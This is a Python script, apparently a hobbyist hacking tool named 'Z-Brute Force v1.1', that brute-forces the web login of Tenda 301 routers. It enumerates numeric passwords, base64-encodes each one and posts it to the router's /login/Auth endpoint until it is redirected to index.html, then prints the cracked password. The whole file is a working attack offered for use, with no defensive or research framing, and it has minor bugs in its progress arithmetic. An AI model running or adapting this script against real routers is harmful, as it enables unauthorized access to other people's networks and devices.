import os, time, requests, base64
#Coded by: Zephio, Nov 2022
spr = '=' * 50
st = time.time()
#wl = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$_&-+()/*":;!?.,~`|•√π÷×¶∆£¢€¥^°={}\%©®™✓[]<>\''
#wl = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ. -_@*#$&,~'
#wl = 'abcdefghijklmnopqrstuvwxyz'
wl = '0123456789'

os.system('cls')
#os.system('clear')
os.system('Color 6')


logo = ("""\

 ZZZZZZZZZZ EEEEEEEEEE PPPPPPPPP  HHH    HHH III   OOOOOO
 ZZZZZZZZZZ EEEEEEEEEE PPPPPPPPPP HHH    HHH III  OOOOOOOO
 ZZ    ZZZ  EEE     EE PPP    PPP HHH    HHH III OOOO  OOOO
 Z    ZZZ   EEE      E PPP    PPP HHH    HHH III OOO    OOO
     ZZZ    EEEEEE     PPPPPPPPP  HHHHHHHHHH III OOO    OOO
    ZZZ     EEEEEE     PPPPPPPP   HHHHHHHHHH III OOO    OOO
   ZZZ    Z EEE      E PPP        HHH    HHH III OOO    OOO
  ZZZ    ZZ EEE     EE PPP        HHH    HHH III OOOO  OOOO
 ZZZZZZZZZZ EEEEEEEEEE PPP        HHH    HHH III  OOOOOOOO
 ZZZZZZZZZZ EEEEEEEEEE PPP        HHH    HHH III   OOOOOO

Application Name: Z-Brute Force v1.1
Target: Tenda 301
Coded by: Zephio
Language: Python 3.10
11-29-2022
\n""")

print(logo)
print(spr)
ip = input('IP gateaway: ')
#ip = '192.168.2.1'
#lpw = 8
#inp = input('Pass: ')
lpw = int(input('Length of Password: '))
wll = len(wl)

os.system('Color 2')
print(spr)

def ZBruter(n):
    return ((n == 0) and wl[0]) or (ZBruter(n // wll).lstrip(wl[0]) + wl[n % wll])
for i in range(wll ** lpw):
    psw = ZBruter(i).zfill(lpw)
    encode = base64.b64encode(bytes(psw, 'utf-8')).decode('ascii')
    payload = {'password': encode}
    login = requests.post('http://'+ip+'/login/Auth', data=payload, allow_redirects=True)
    print('Index:', hex(i), '/', hex(lpw ** wll), '\nProgress:', (i / ((lpw ** wll) * 100)), '\nPass:', psw, '\n'+spr)
    if 'http://'+ip+'/index.html' == login.url:
    #if (psw == inp):
        os.system('cls')
        #os.system('clear')
        os.system('Color 9')
        print(logo)
        print(spr, format('\n Status: Done \n Password: %s \n Pos: %x/%x \n Time: %s S' % (psw, i, wll ** lpw, int(time.time() - st))))
        print(spr)
        #print('Pass: ' + psw)
        break
    else:
    	print('Index:', hex(i), '/', hex(lpw ** wll), '\nProgress:', (i / ((lpw ** wll) * 100)), '\nPass:', psw, '\n'+spr)

